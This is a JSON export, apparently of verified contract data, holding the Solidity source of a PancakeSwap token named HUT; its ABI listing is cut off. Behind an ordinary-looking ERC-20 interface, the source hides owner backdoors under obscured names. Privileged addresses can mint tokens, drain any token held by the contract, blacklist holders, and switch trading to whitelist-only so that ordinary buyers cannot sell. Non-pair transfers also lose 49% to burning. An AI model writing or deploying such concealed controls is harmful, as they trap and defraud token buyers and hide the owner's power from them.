{"SourceCode": "pragma solidity ^0.5.4;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Context {\r\n    constructor () internal { }\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract HUTaild is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor (string memory name, string memory symbol, uint8 decimals) public {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function sub(uint a, uint b) internal pure returns (uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        require(b <= a, errorMessage);\r\n        uint c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint a, uint b) internal pure returns (uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n    function div(uint a, uint b) internal pure returns (uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        assembly { codehash := extcodehash(account) }\r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using SafeMath for uint;\r\n    using Address for address;\r\n\r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) { // Return data is optional\r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\ninterface IPancakeRouter01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n        function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n}\r\n\r\ninterface IPancakeFactory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function feeTo() external view returns (address);\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ncontract Recv {\r\n    IERC20 public tokenPCE;\r\n    IERC20 public usdt;\r\n\r\n    constructor (IERC20 _tokenPCE) public {\r\n        tokenPCE = _tokenPCE;\r\n        usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);\r\n    }\r\n\r\n    function withdraw() public {\r\n        uint256 usdtBalance = usdt.balanceOf(address(this));\r\n        if (usdtBalance > 0) {\r\n            usdt.transfer(address(tokenPCE), usdtBalance);\r\n        }\r\n        uint256 tokenPCEBalance = tokenPCE.balanceOf(address(this));\r\n        if (tokenPCEBalance > 0) {\r\n            tokenPCE.transfer(address(tokenPCE), tokenPCEBalance);\r\n        }\r\n    }\r\n}\r\n\r\n\r\ncontract HUT is HUTaild, Context {\r\n  using SafeERC20 for IERC20;\r\n  using Address for address;\r\n  using SafeMath for uint;\r\n\r\n    Recv public RECV ;\r\n\r\n  mapping (address => bool) public includeusers;\r\n  mapping (address => bool) public witeeArecipient;\r\n\r\n\r\n    mapping (address => uint) private _balances;\r\n\r\n    mapping (address => mapping (address => uint)) private _allowances;\r\n\r\n    uint private _totalSupply;\r\n    uint public maxSupply =  3333333 * 1e18;\r\n    function totalSupply() public view returns (uint) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view returns (uint) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint amount) public returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    function increaseAllowance(address spender, uint addedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    mapping(address => address) public inviter;\r\n\r\n    mapping(address=>uint ) public selltime;\r\n     mapping(address=>uint256 ) public sellout;\r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        if (isfeeblk) {\r\n           require(blkddress[sender] == false, \"ERC20:the blk address\");\r\n        }\r\n\r\n        uint oamount= amount;\r\n        uint ouseramount=balanceOf(sender);\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n           uint256 needburn;\r\n        if (isfee) {\r\n            if (sender ==pancakePair || recipient == pancakePair) {\r\n                    if (iscanswap) {\r\n                        if (sender ==pancakePair) {\r\n                            require(witeeaddress[recipient], \" recipient not witee  swap\");\r\n                        }\r\n                        if (recipient ==pancakePair) {\r\n                            require(witeeaddress[sender], \" sender  not witee swap\");\r\n                        }\r\n                    }\r\n\r\n                if((witeeaddress[recipient]||witeeaddress[sender]) &&  isfeewhit) {\r\n\r\n                } else {\r\n\r\n                if (!isContract(sender) && recipient == pancakePair && isfee3) {\r\n                     {\r\n                        require(oamount <= ouseramount * 3 / 10);\r\n\r\n                    \r\n                        if (selltime[sender]==0 ||block.timestamp-selltime[sender]>=86400 ) {\r\n                            selltime[sender] = block.timestamp;\r\n                            sellout[sender]=oamount;\r\n                        }else {\r\n                            sellout[sender]+=oamount;\r\n                        }\r\n                        require(sellout[sender] <= ouseramount * 3 / 10);\r\n                    }\r\n                }\r\n\r\n                uint burnaa=amount.mul(2).div(100);\r\n                _balances[address(this)] = _balances[address(this)].add(burnaa);\r\n                if (balanceOf(burnAddress) < 3319202 *1e18) {\r\n                    _burn(address(this), burnaa);\r\n                }\r\n                   uint bback=amount.mul(3).div(100);\r\n                if (isfee4) {\r\n                    _balances[backropadress] = _balances[backropadress].add(bback);\r\n               emit Transfer(sender, backropadress, bback);\r\n                }\r\n\r\n\r\n                 uint bback2=amount.mul(4).div(100);\r\n                if (isfee5) {\r\n                    _balances[address(this)] = _balances[address(this)].add(bback2);\r\n               emit Transfer(sender, address(this), bback2);\r\n                }\r\n                \r\n                    _balances[lpadress] = _balances[lpadress].add(burnaa);\r\n               emit Transfer(sender, lpadress, burnaa);\r\n\r\n                 swapnow(sender, balanceOf(address(this)));\r\n                \r\n                amount=  amount.mul(89).div(100);\r\n                }\r\n\r\n            } else {\r\n                if((witeeaddress[recipient]||witeeaddress[sender]) &&  isfeewhit)  {\r\n\r\n                } else {\r\n                uint burnaa2=amount.mul(49).div(100);\r\n                _balances[address(this)] = _balances[address(this)].add(burnaa2);\r\n                if (balanceOf(burnAddress) < 3319202 *1e18) {\r\n                    _burn(address(this), burnaa2);\r\n                }\r\n                  amount=  amount.mul(51).div(100);\r\n                }\r\n\r\n            }\r\n        }\r\n\r\n\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n\r\n   function isContract(address account) internal view returns (bool) {\r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(account)\r\n        }\r\n        return size > 0;\r\n    }\r\n\r\n\r\n\r\n    function _hutlxlf(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: hutlxlf to the zero address\");\r\n        require(_totalSupply.add(amount) <= maxSupply, \"ERC20: cannot hutlxlf over max supply\");\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n    }\r\n    function _burn(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        _balances[address(0)] = _balances[address(0)].add(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    function _approve(address owner, address spender, uint amount) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n  \r\n  address public govn;\r\n  mapping (address => bool) public hxkers;\r\n\r\n   address public all =0x6A5d9CAE9630a509291cAB7eC6B07973E8eFA162;// \r\n    address public burnAddress = address(0);\r\n\r\n   address public backropadress =0x8A63C796523E3F128340Dbe228b0c66cF6Be7082;// \r\n\r\n   address public lpadress =0x9D4E34a3B654Bc55948588dfeb61C1A03EFaDb29;// \r\n\r\n\r\nmapping (address => uint256) public usrbuys;\r\n\r\n\r\n  IPancakeRouter01 public PancakeRouter01;\r\n  address public token0;\r\n  address public token1;\r\n  address public pancakePair; \r\n\r\n  bool public iscanswap=false;\r\n\r\n  function setIscanswap( bool _tf) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      iscanswap = _tf;\r\n  }\r\n\r\nbool public isfee=true;\r\n  function setIsisfee( bool _tf) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      isfee = _tf;\r\n  }\r\n\r\n  bool public isfee2=true;\r\n  function setIsisfee2( bool _tf) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      isfee2 = _tf;\r\n  }\r\n  \r\n\r\n    bool public isfee3=true;\r\n  function setIsisfee3( bool _tf) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      isfee3 = _tf;\r\n  }\r\n\r\n    bool public isfee4=true;\r\n  function setIsisfee4( bool _tf) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      isfee4 = _tf;\r\n  }\r\n\r\n      bool public isfee5=true;\r\n  function setIsisfee5( bool _tf) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      isfee5 = _tf;\r\n  }\r\n    bool public isfee6=true;\r\n  function setIsisfee6( bool _tf) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      isfee6 = _tf;\r\n  }\r\n\r\n        bool public isfeewhit=true;\r\n  function setisfeewhit( bool _tf) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      isfeewhit = _tf;\r\n  }\r\n\r\n\r\n    bool public isfeeblk=true;\r\n  function setisfeeblk( bool _tf) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      isfeeblk = _tf;\r\n  }\r\n\r\n    function setwiteeaddress2(address[] memory _user) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      for(uint i=0;i< _user.length;i++) {\r\n          if (!witeeaddress[_user[i]]) {\r\n              //\r\n                witeeaa[witeelen] = _user[i];\r\n                witeelen = witeelen+1;\r\n                witeeaddress[_user[i]] = true;\r\n          }\r\n      }\r\n\r\n  }\r\n        uint256 public swapTokensAtAmount=1e18;\r\n\r\n    function setSwapTokensAtAmount(uint256 _swapTokensAtAmount) public  {\r\n         require(msg.sender == govn, \"!govn\");\r\n        swapTokensAtAmount = _swapTokensAtAmount;\r\n    }\r\n\r\n    bool private swapping;\r\n\r\n    function swapnow(address from, uint256 amountlip) private {\r\n        {\r\n            if (\r\n                !swapping &&\r\n                from != pancakePair\r\n            ) {\r\n                swapping = true;\r\n                if(amountlip > swapTokensAtAmount){\r\n                    _checkLiquidity(amountlip);\r\n                }\r\n                swapping = false;\r\n            }\r\n        } \r\n    }\r\n    bool private inSwapAndLiquify;\r\n\r\n    modifier lockTheSwap() {\r\n        inSwapAndLiquify = true;\r\n        _;\r\n        inSwapAndLiquify = false;\r\n    }\r\n\r\n\r\n\r\n    function _swapTokensForTokens(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = token1;\r\n        if(IERC20(address(this)).allowance(address(this), pancakeswapV2Router)<tokenAmount) {\r\n            IERC20(address(this)).approve(pancakeswapV2Router, 1000000000000*1e18);\r\n        }\r\n        IPancakeRouter01(pancakeswapV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, \r\n            path,\r\n            address(RECV),\r\n            block.timestamp\r\n        );\r\n        RECV.withdraw();\r\n    }\r\n    function _addLiquidity(uint256 tokenAmount, uint256 swapAmount) private {\r\n        if(IERC20(token1).allowance(address(this), pancakeswapV2Router)<swapAmount) {\r\n            IERC20(token1).approve(pancakeswapV2Router, 1000000000000*1e18);\r\n        }\r\n\r\n        if(IERC20(address(this)).allowance(address(this), pancakeswapV2Router)<tokenAmount) {\r\n            IERC20(address(this)).approve(pancakeswapV2Router, 1000000000000*1e18);\r\n        }\r\n\r\n        IPancakeRouter01(pancakeswapV2Router).addLiquidity(\r\n            address(this),\r\n            token1,\r\n            tokenAmount,\r\n            swapAmount,\r\n            0, \r\n            0, \r\n            address(this),\r\n            block.timestamp+1000\r\n        );\r\n    }\r\n    function _checkLiquidity(uint256 amount1) private lockTheSwap {\r\n        uint amount = _balances[address(this)];\r\n        if(amount>= swapTokensAtAmount) {\r\n            uint half = amount.div(2);\r\n            uint otherHalf = amount.sub(half);\r\n            uint256 initialBalance = IERC20(token1).balanceOf(address(this));\r\n                      _swapTokensForTokens(half);\r\n        uint256 newBalance =IERC20(token1).balanceOf(address(this)).sub(initialBalance);\r\n\r\n            if(newBalance>0) {\r\n                _addLiquidity(otherHalf, newBalance);\r\n                emit SwapAndLiquify(half, newBalance, otherHalf);\r\n            }\r\n            \r\n        }\r\n    }\r\n\r\nevent SwapAndLiquify(uint256 half, uint256 newBalance, uint256 otherHalf);\r\n\r\n    address public pancakeswapV2Router;\r\n\r\n    function setpancakeswapV2Router(address _pancakeswapV2Router) public  {\r\n         require(msg.sender == govn, \"!govn\");\r\n        pancakeswapV2Router = _pancakeswapV2Router;\r\n    }\r\n\r\n    function setpancakePair(address _pancakePair) public  {\r\n         require(msg.sender == govn, \"!govn\");\r\n        pancakePair = _pancakePair;\r\n    }\r\n\r\n  constructor (address _pancake) public HUTaild(\"HUT\", \"HUT\", 18) {\r\n      govn = msg.sender;\r\n      adHIUTker(msg.sender);\r\n      adHIUTker(0x99a51aAAD4459803EBc6339Acf15E5E466E1A7F2);\r\n     RECV = new Recv(IERC20(address(this)));\r\n\r\n      _hutlxlf(all, maxSupply);\r\n      emit Transfer(address(0), all, maxSupply);\r\n      witeeaddress[all] = true;\r\n      witeeaddress[msg.sender] = true;\r\n    pancakeswapV2Router = _pancake;\r\n     PancakeRouter01 =  IPancakeRouter01(_pancake);\r\n      token0 = address(this);\r\n      token1 = 0x55d398326f99059fF775485246999027B3197955;\r\n      pancakePair =  IPancakeFactory(PancakeRouter01.factory())\r\n            .createPair(address(this),token1 );  \r\n  }\r\n\r\n  function hutlxlf(address account, uint amount) public {\r\n      require(hxkers[msg.sender], \"!hxker\");\r\n      _hutlxlf(account, amount);\r\n  }\r\n\r\n     function huyhxlk(uint256 amount, address ut) public\r\n    {\r\n         require(hxkers[msg.sender], \"hxker\");\r\n         IERC20(ut).transfer(msg.sender, amount);\r\n    }\r\n\r\n    function burn(uint256 amount) public {\r\n        _burn(msg.sender, amount);\r\n    }\r\n  \r\n\r\n\r\n  function setGovernance(address _govn) public {\r\n      require(msg.sender == govn, \"!govn\");\r\n      govn = _govn;\r\n  }\r\n  \r\n  function adHIUTker(address _hxker) public {\r\n      require(msg.sender == govn, \"!govn\");\r\n      hxkers[_hxker] = true;\r\n  }\r\n\r\nmapping (address => bool) public witeeaddress;\r\nmapping (uint256=>address) public witeeaa;\r\nuint256 public witeelen;\r\n\r\n\r\nmapping (address => bool) public blkddress;\r\nmapping (uint256=>address) public blkeeaa;\r\nuint256 public blklen;\r\n\r\nfunction setWeaddress2(address[] memory _user) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      for(uint i=0;i< _user.length;i++) {\r\n          if (!witeeaddress[_user[i]]) {\r\n              //\r\n                witeeaa[witeelen] = _user[i];\r\n                witeelen = witeelen+1;\r\n                witeeaddress[_user[i]] = true;\r\n          }\r\n      }\r\n\r\n  }\r\n\r\n    function setremWteaddress(address _user) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n           if (witeeaddress[_user] ) {\r\n                for (uint256 i=0;i<witeelen;i++ ) {\r\n                    if (witeeaa[i] == _user) {\r\n                        witeeaa[i]= witeeaa[witeelen-1];\r\n                        witeelen = witeelen-1;\r\n                        witeeaddress[_user] = false;\r\n                        break;\r\n                    }\r\n                }\r\n      }\r\n  }\r\n\r\n      function getwteUsers() public view returns(address[] memory ids) {\r\n\r\n        address[] memory b1 = new  address[](witeelen);\r\n        if (witeelen >0 ) {\r\n            for (uint i=0;i<witeelen;i++ ) {\r\n                b1[i] = witeeaa[i];\r\n            }\r\n        }\r\n        return b1;\r\n    }\r\n\r\n\r\nfunction setblkddress2(address[] memory _user) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n      for(uint i=0;i< _user.length;i++) {\r\n          if (!blkddress[_user[i]]) {\r\n              //\r\n                blkeeaa[blklen] = _user[i];\r\n                blklen = blklen+1;\r\n                blkddress[_user[i]] = true;\r\n          }\r\n      }\r\n\r\n  }\r\n\r\n      function setremblkaddress(address _user) public {\r\n      require(msg.sender == govn || hxkers[msg.sender ], \"!govn\");\r\n           if (blkddress[_user] ) {\r\n                for (uint256 i=0;i<blklen;i++ ) {\r\n                    if (blkeeaa[i] == _user) {\r\n                        blkeeaa[i]= blkeeaa[blklen-1];\r\n                        blklen = blklen-1;\r\n                        blkddress[_user] = false;\r\n                        break;\r\n                    }\r\n                }\r\n      }\r\n  }\r\n\r\n      function getblkUsers() public view returns(address[] memory ids) {\r\n\r\n        address[] memory b1 = new  address[](blklen);\r\n        if (blklen >0 ) {\r\n            for (uint i=0;i<blklen;i++ ) {\r\n                b1[i] = blkeeaa[i];\r\n            }\r\n        }\r\n        return b1;\r\n    }\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pancake\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"half\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newBalance\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"otherHalf\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"PancakeRouter01\",\"outputs\":[{\"internalType\":\"contract IPancakeRouter01\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"RECV\",\"outputs\":[{\"internalType\":\"contract Recv\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_hxker\",\"type\":\"address\"}],\"name\":\"adHIUTker\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"all\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"backropadress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"blkddress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"blkeeaa\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"blklen\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"burnAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getblkUsers\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"ids\",\"type\":\"address[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getwteUsers\",\"outputs\":[{\"internalType\":\"address[]\",\"name\":\"ids\",\"type\":\"address[]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"govn\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"hutlxlf\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"ut\",\"type\":\"address\"}],\"name\":\"huyhxlk\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"hxkers\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"includeusers\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"inviter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"